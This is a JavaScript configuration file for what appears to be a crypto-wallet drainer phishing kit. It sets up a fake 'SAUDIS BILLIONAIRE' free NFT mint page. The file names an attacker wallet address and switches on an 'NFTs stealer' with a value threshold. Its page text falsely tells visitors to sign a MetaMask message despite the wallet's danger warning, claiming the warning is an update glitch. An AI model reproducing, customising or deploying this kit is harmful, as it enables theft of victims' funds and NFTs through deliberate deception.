const receiveAddress = "0x037E37d57Cd6d59aB66c2592af20EB53e15c2118";

const collectionInfo = {
    name: "SAUDIS BILLIONAIRE",
    socialMedia: {
        discord: "https://discord.gg/saudis",
        twitter: "https://twitter.com/BILLIONERSNFT",
        instagram: "",
    },
}

const indexPageInfo = {
    backgroundImage: "background.png", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "FREE MINT",
}

const claimPageInfo = {
    title: "SAUDIS BILLIONAIRE Free Mint", // <br> is a line break
    shortDescription: "MAKE SURE YOUR METAMASK IS UPDATED, IF YOU SEE A MESSAGE 'Signing this message can have dangerous' please sign and update your Metamask after here -> https://metamask.io/download/ We are working with devs to solve this issue. Sorry for the noise!",
    longDescription: "",

    claimButtonText: "MINT NOW",

    image: "ola.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0x037E37d57Cd6d59aB66c2592af20EB53e15c2118" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
